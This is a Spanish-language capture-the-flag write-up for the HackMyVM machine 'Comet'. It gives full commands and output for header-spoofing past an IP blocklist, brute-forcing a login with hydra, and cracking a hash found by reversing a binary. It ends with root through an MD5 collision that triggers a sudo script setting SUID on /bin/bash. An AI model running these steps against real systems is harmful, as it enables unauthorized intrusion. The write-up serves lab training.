---
title: "Comet Write-Up - HackMyVM"
description: "Comet Write-Up - HackMyVM"
pubDatetime: 2023-08-31
tags: ["media", "hackmyvm", "WAF bypass", "reversing", "md5 collision"]
---

# Reconocimiento

Primeramente realizaremos un scaneo al rango de red local para verificar la IP de la máquina (aunque en VirtualBox ya nos lo indique es buena práctica).

```bash
❯ nmap -sn 192.168.18.0/24
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-19 13:47 CEST
Nmap scan report for 192.168.18.1
Host is up (0.0086s latency).
Nmap scan report for 192.168.18.37
Host is up (0.00018s latency).
Nmap scan report for 192.168.18.94
Host is up (0.00046s latency).
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.38 seconds
```

`192.168.18.1` es la [default gateway](https://en.wikipedia.org/wiki/Default_gateway), la `192.168.18.37` es nuestra máquina, por lo que la IP **192.168.18.94** tiene que corresponder a la máquina _Comet_.

Realizamos un scaneo rápido (pero más exhaustivo) para determinar los puertos abiertos y los servicios que corren por estos:

```bash
❯ sudo nmap -sSCV -p- --open --min-rate 5000 -n -Pn 192.168.18.94 -oN target
[sudo] password for ziox:
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-19 13:53 CEST
Nmap scan report for 192.168.18.94
Host is up (0.00023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c (RSA)
|   256 33:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad (ECDSA)
|_  256 be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: CyberArray
|_http-server-header: Apache/2.4.54 (Debian)
MAC Address: 08:00:27:4E:76:47 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.89 seconds
```

Vemos dos puertos abiertos por TCP: **el 22 (SSH) y el 80 (HTTP)**. Por ahora no tenemos credenciales para acceder mediante SSH por lo que le echamos un ojo a la página web.

A primera vista nos llama la atención un panel de login. Pero no podemos hacer nada ya que al parecer el servidor bloquea peticiones cuando fallas dos veces la contraseña y se queda congelado.

También encontramos un par de supuestos usuarios (**admin** y **owner**) en el apartado `blog.html`, nos servirá más tarde.

Revisando la página, a simple vista no encontramos nada interesante, por lo que realizaremos un poco de _fuzzing_.

```bash
❯ gobuster dir -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -u "http://192.168.18.94/" -t "200" -x "html,php,txt"
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.18.94/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2023/06/19 14:05:59 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 7097]
/login.php            (Status: 200) [Size: 1443]
/images               (Status: 301) [Size: 315] [--> http://192.168.18.94/images/]
/support.html         (Status: 200) [Size: 6329]
/blog.html            (Status: 200) [Size: 8242]
/about.html           (Status: 200) [Size: 7024]
/contact.html         (Status: 200) [Size: 5886]
/ip.txt               (Status: 200) [Size: 0]
/js                   (Status: 301) [Size: 311] [--> http://192.168.18.94/js/]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 878733 / 882244 (99.60%)
===============================================================
2023/06/19 14:07:42 Finished
===============================================================
```

Con la herramiento **Gobuster** rápidamente encontramos una dirección que no habíamos visto pero que llama la atención: `ip.txt`. Al parecer este archivo es una especie de blacklist en la cual si aparece nuestra IP, bloqueará nuestras peticiones, una especie de _firewall_.

## Explotación

Para intentar evadir este bloqueo, intento, mediante **curl** el uso del header **X-ORIGINATING-IP** para cambiar la IP de origen y que así en la blacklist no aparezca realmente la IP de mi máquina. Utilizo la `127.0.0.1` porque suele estar permitida por el servidor ya que es una IP interna.

```bash
❯ curl 'http://192.168.18.94/login.php/' -X POST -d 'username=admin&password=admin' -H 'X-ORIGINATING-IP: 127.0.0.1'

<!DOCTYPE html>
<html>
  <head>
    <title>Sign In</title>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="login.css">
  </head>
  <body>
    <form class="form" autocomplete="off" method="post">
      <div class="control">
        <h1>Sign In</h1>
...
            <p>Invalid username or password</p>
          </form>
  </body>
</html>
```

Nos deja hacer varias peticiones seguidas por lo que hemos conseguido [bypassear el firewall](https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c) y podremos intentar un ataque de fuerza bruta sin problemas. Para esto utilizaremos la herramienta **hydra**.

Para entender la sintaxis recomiendo leer el siguiente artículo: [How to Brute Force Websites & Online Forms Using Hydra](https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/)

```bash
❯ hydra -l "admin" -P "/usr/share/seclists/rockyou.txt" 192.168.18.94 http-post-form "/login.php:username=admin&password=^PASS^:H=X-ORIGINATING-IP: 127.0.0.1:F=Invalid username"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-19 14:49:27
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://192.168.18.94:80/login.php:username=admin&password=^PASS^:H=X-ORIGINATING-IP: 127.0.0.1:F=Invalid username
[STATUS] 4425.00 tries/min, 4425 tries in 00:01h, 14339973 to do in 54:01h, 16 active
[80][http-post-form] host: 192.168.18.94   login: admin   password: solitario
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-19 14:50:50
```

Nos logueamos como admin y nos lleva al directorio `logFire` donde hay muchos logs y al final un archivo que nos llama la atención `firewall_update`.

Nos lo traemos a nuestra máquina para analizarlo.

```bash
❯ file firewall_update
firewall_update: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c8b4cde0414ff49d15473b0d47cde256c7931587, for GNU/Linux 3.2.0, not stripped

❯ ./firewall_update
Enter password: solitario
Incorrect password
```

Vemos que es un binario y al ejecutarlo nos pide contraseña, pero no se reutiliza por lo que pasamos a analizarlo más a fondo, para esto utilizaremos **radare2**.

```bash
❯ r2 firewall_update
[0x000010b0]> aaa
[0x000010b0]> pdf @main
...
│           0x000011a4      48b862383732.  movabs rax, 0x3862613832373862 ; 'b8728ab8'
│           0x000011ae      48ba31613363.  movabs rdx, 0x3139333363336131 ; '1a3c3391'
│           0x000011b8      48898560ffff.  mov qword [s1], rax
│           0x000011bf      48899568ffff.  mov qword [var_98h], rdx
│           0x000011c6      48b866356636.  movabs rax, 0x3933663336663566 ; 'f5f63f39'
│           0x000011d0      48ba64613732.  movabs rdx, 0x3938656532376164 ; 'da72ee89'
│           0x000011da      48898570ffff.  mov qword [var_90h], rax
│           0x000011e1      48899578ffff.  mov qword [var_88h], rdx
│           0x000011e8      48b866343366.  movabs rax, 0x6639613966333466 ; 'f43f9a9f'
│           0x000011f2      48ba34323962.  movabs rdx, 0x6663386362393234 ; '429bc8cf'
│           0x000011fc      48894580       mov qword [var_80h], rax
│           0x00001200      48895588       mov qword [var_78h], rdx
│           0x00001204      48b865383538.  movabs rax, 0x3430386638353865 ; 'e858f804'
│           0x0000120e      48ba38656161.  movabs rdx, 0x3162326461616538 ; '8eaad2b1'
...
│           0x00001224      488d05d90d00.  lea rax, str.Enter_password:_ ; 0x2004 ; "Enter password: "
│           0x0000122b      4889c7         mov rdi, rax                ; const char *format
│           0x0000122e      b800000000     mov eax, 0
│           0x00001233      e8f8fdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00001238      488d45b0       lea rax, [s]
│           0x0000123c      4889c6         mov rsi, rax
│           0x0000123f      488d05cf0d00.  lea rax, [0x00002015]       ; "%s"
│           0x00001246      4889c7         mov rdi, rax                ; const char *format
│           0x00001249      b800000000     mov eax, 0
│           0x0000124e      e83dfeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x00001253      488d45b0       lea rax, [s]
│           0x00001257      4889c7         mov rdi, rax                ; const char *s
│           0x0000125a      e801feffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x0000125f      4889c1         mov rcx, rax
│           0x00001262      488d55d0       lea rdx, [var_30h]
│           0x00001266      488d45b0       lea rax, [s]
│           0x0000126a      4889ce         mov rsi, rcx
│           0x0000126d      4889c7         mov rdi, rax
│           0x00001270      e8dbfdffff     call sym.imp.SHA256
...
│           0x000012ce      4889d6         mov rsi, rdx                ; const char *s2
│           0x000012d1      4889c7         mov rdi, rax                ; const char *s1
│           0x000012d4      e8a7fdffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
│           0x000012d9      85c0           test eax, eax
│       ┌─< 0x000012db      7511           jne 0x12ee
│       │   0x000012dd      488d05390d00.  lea rax, str.Firewall_successfully_updated ; 0x201d ; "Firewall successfully updated"
│       │   0x000012e4      4889c7         mov rdi, rax                ; const char *s
│       │   0x000012e7      e854fdffff     call sym.imp.puts           ; int puts(const char *s)
│      ┌──< 0x000012ec      eb0f           jmp 0x12fd
│      ││   ; CODE XREF from main @ 0x12db(x)
│      │└─> 0x000012ee      488d05460d00.  lea rax, str.Incorrect_password ; 0x203b ; "Incorrect password"
...
```

Mirando solo las líneas que nos interesan, el programa lo que hace es coger nuestro input hashearlo a SHA256 y compararlo con un hash ya definido en el programa: `b8728ab81a3c3391f5f63f39da72ee89f43f9a9f429bc8cfe858f8048eaad2b1`

Con la herramienta **hashcat** intentamos romper el hash.

```bash
❯ hashcat -a 0 hash -m 1400 /usr/share/seclists/rockyou.txt
hashcat (v6.2.6) starting

...

Dictionary cache built:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 2 secs

b8728ab81a3c3391f5f63f39da72ee89f43f9a9f429bc8cfe858f8048eaad2b1:p**********

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: b8728ab81a3c3391f5f63f39da72ee89f43f9a9f429bc8cfe85...aad2b1
Time.Started.....: Mon Jun 19 15:57:29 2023 (0 secs)
Time.Estimated...: Mon Jun 19 15:57:29 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   110.9 kH/s (1.27ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 12288/14344384 (0.09%)
Rejected.........: 0/12288 (0.00%)
Restore.Point....: 8192/14344384 (0.06%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: toodles -> havana
Hardware.Mon.#1..: Temp: 65c Util: 42%

...
```

Al introducir la contraseña aparentemente no sucede nada.

```bash
❯ ./firewall_update
Enter password: p**********
Firewall successfully updated
```

Probamos con SSH por si se reciclan credenciales. De primeras no tenemos ningún usuario, podríamos tirar de fuerza bruta de nuevo, pero antes vamos a buscar primero en los logs de antes para ver si encontramos alguno.

```bash
❯ wget -rq http://192.168.18.94/logFire/

❯ cat firewall.log* | grep -vE "unauthorized|refused|Intrusion|Dropped|detected"
2023-02-19 16:35:31 192.168.1.10 | 192.168.1.50 | Allowed | Inbound connection | Joe
```

Filtrando por palabras que no nos interesan damos con un usuario: Joe.

```bash
❯ ssh joe@192.168.18.94
joe@192.168.18.94's password:
Linux comet.hmv 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jun 18 17:56:32 2023 from 192.168.18.37
joe@comet:~$
```

Tenemos shell!

En el directorio home encontramos la primera flag `user.txt`.

```bash
joe@comet:~$ ls -la
total 32
drwxr-xr-x 3 joe  joe  4096 Jun 19 14:22 .
drwxr-xr-x 3 root root 4096 Feb 19 19:33 ..
lrwxrwxrwx 1 root root    9 Feb 25 17:03 .bash_history -> /dev/null
-rw-r--r-- 1 joe  joe   220 Feb 19 10:51 .bash_logout
-rw-r--r-- 1 joe  joe  3526 Feb 19 10:51 .bashrc
-rwxr-xr-x 1 root root  366 Feb 19 10:51 coll
drwxr-xr-x 3 joe  joe  4096 Feb 19 10:51 .local
-rw-r--r-- 1 joe  joe   807 Feb 19 10:51 .profile
-rwx------ 1 joe  joe    33 Feb 19 10:51 user.txt
```

## Escalada

No encontramos ningún archivo interesante con permisos SUID.

```bash
joe@comet:~$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/umount
```

Buscamos archivos ejecutables como otro usuario.

```bash
joe@comet:~$ sudo -l
Matching Defaults entries for joe on comet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User joe may run the following commands on comet:
    (ALL : ALL) NOPASSWD: /bin/bash /home/joe/coll
```

En este caso podemos ejecutar `/bin/bash /home/joe/coll` como cualquier usuario. Vamos a analizarlo.

```bash
❯ cat coll
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
	   │ File: coll
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #!/bin/bash
   2   │ exec 2>/dev/null
   3   │
   4   │ file1=/home/joe/file1
   5   │ file2=/home/joe/file2
   6   │ md5_1=$(md5sum $file1 | awk '{print $1}')
   7   │ md5_2=$(md5sum $file2 | awk '{print $1}')
   8   │
   9   │
  10   │ if      [[ $(head -n 1 $file1) == "HMV" ]] &&
  11   │     [[ $(head -n 1 $file2) == "HMV" ]] &&
  12   │     [[ $md5_1 == $md5_2 ]] &&
  13   │     [[ $(diff -q $file1 $file2) ]]; then
  14   │     chmod +s /bin/bash
  15   │     exit 0
  16   │ else
  17   │     exit 1
  18   │ fi
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Este programa toma dos archivos (`file1` y `file2`), calcula sus hashes MD5 con `md5sum` y realiza una serie de comprobaciones:

- Comprueba que la cabecera de ambos sea "HMV".
- Comprueba que compartan el mismo hash MD5.
- Comprueba que tengan alguna diferencia.
  Si todo se cumple, se establece el permiso SUID sobre `/bin/bash`.

Buscando un poco de información, encontramos que esto se trata de lo que se conoce como [_hash collision_](https://en.wikipedia.org/wiki/Hash_collision). Para explotar esto y generar archivos distintos pero con el mismo MD5, utilizaré una herramienta generadora de colisiones MD5: https://github.com/seed-labs/seed-labs/tree/master/category-crypto/Crypto_MD5_Collision/, aquí se explica su funcionamiento: https://seedsecuritylabs.org/Labs_20.04/Files/Crypto_MD5_Collision/Crypto_MD5_Collision.pdf

```bash
joe@comet:~$ echo "HMV" > prefix

joe@comet:~$ chmod +x md5collgen

joe@comet:~$ ./md5collgen -p prefix -o file1 file2
MD5 collision generator v1.5
by Marc Stevens (http://www.win.tue.nl/hashclash/)

Using output filenames: 'file1' and 'file2'
Using prefixfile: 'prefix'
Using initial value: c8b6027e3f3d9c13daa4b803adcd13be

Generating first block: .....................................
Generating second block: W..............
Running time: 37.6077 s

joe@comet:~$ diff file1 file2
Binary files file1 and file2 differ

joe@comet:~$ xxd file1;xxd file2
00000000: 484d 5600 0000 0000 0000 0000 0000 0000  HMV.............
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000040: c0c9 3066 123f aa08 341a 1edf 58e9 fcb3  ..0f.?..4...X...
00000050: 8e66 c673 f620 2ce5 3432 3bf5 eb8e a2bf  .f.s. ,.42;.....
00000060: 86c1 cd0b ecb1 cdd2 4702 3e83 16ee 9b70  ........G.>....p
00000070: 1a82 9dc9 8483 768f 3daf 5291 c65d 4c74  ......v.=.R..]Lt
00000080: 0e62 a5ac 1ade 0c52 8504 383b 1f24 29bf  .b.....R..8;.$).
00000090: 9950 0529 d15a 282c 0219 9e17 4b6c edde  .P.).Z(,....Kl..
000000a0: d537 fb06 1157 a866 3e34 4dda 8698 b27c  .7...W.f>4M....|
000000b0: e4b8 36cb 95c2 b399 1616 8aea 8f0c a86b  ..6............k

00000000: 484d 5600 0000 0000 0000 0000 0000 0000  HMV.............
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000040: c0c9 3066 123f aa08 341a 1edf 58e9 fcb3  ..0f.?..4...X...
00000050: 8e66 c6f3 f620 2ce5 3432 3bf5 eb8e a2bf  .f... ,.42;.....
00000060: 86c1 cd0b ecb1 cdd2 4702 3e83 166e 9c70  ........G.>..n.p
00000070: 1a82 9dc9 8483 768f 3daf 5211 c65d 4c74  ......v.=.R..]Lt
00000080: 0e62 a5ac 1ade 0c52 8504 383b 1f24 29bf  .b.....R..8;.$).
00000090: 9950 05a9 d15a 282c 0219 9e17 4b6c edde  .P...Z(,....Kl..
000000a0: d537 fb06 1157 a866 3e34 4dda 8618 b27c  .7...W.f>4M....|
000000b0: e4b8 36cb 95c2 b399 1616 8a6a 8f0c a86b  ..6........j...k
```

Una vez con los archivos creados probamos a correr el programa.

```bash
joe@comet:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash

joe@comet:~$ sudo /bin/bash /home/joe/coll

joe@comet:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash

joe@comet:~$ bash -p

bash-5.1# whoami
root
```

Una vez como root, la flag se encuentra en `/root/root.txt`

```bash
bash-5.1# ls -la /root
total 24
drwx------  3 root root 4096 Feb 21 19:02 .
drwxr-xr-x 18 root root 4096 Feb 20 08:55 ..
lrwxrwxrwx  1 root root    9 Feb  6 19:33 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root 4096 Feb 19 09:08 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rwx------  1 root root   33 Feb  6 19:34 root.txt
```
